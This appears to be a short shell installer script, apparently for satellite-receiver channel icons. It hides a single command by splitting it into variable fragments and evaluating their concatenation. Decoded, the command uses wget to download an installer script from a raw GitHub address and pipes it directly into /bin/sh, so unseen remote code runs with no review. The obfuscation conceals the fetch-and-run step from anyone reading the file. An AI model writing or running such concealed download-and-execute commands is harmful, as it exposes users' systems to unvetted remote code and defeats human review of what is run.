z="
";Az='wget';Rz='in/i';Oz='elsa';Mz='icon';Kz='mil2';Sz='nsta';Wz='- | ';Fz='hubu';Lz='37/p';Yz='/sh';Uz='.sh ';Tz='ller';Cz='ps:/';Dz='/raw';Nz='-eut';Hz='onte';Gz='serc';Jz='om/e';Vz='-qO ';Pz='t_16';Bz=' htt';Xz='/bin';Iz='nt.c';Qz='E/ma';Ez='.git';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz"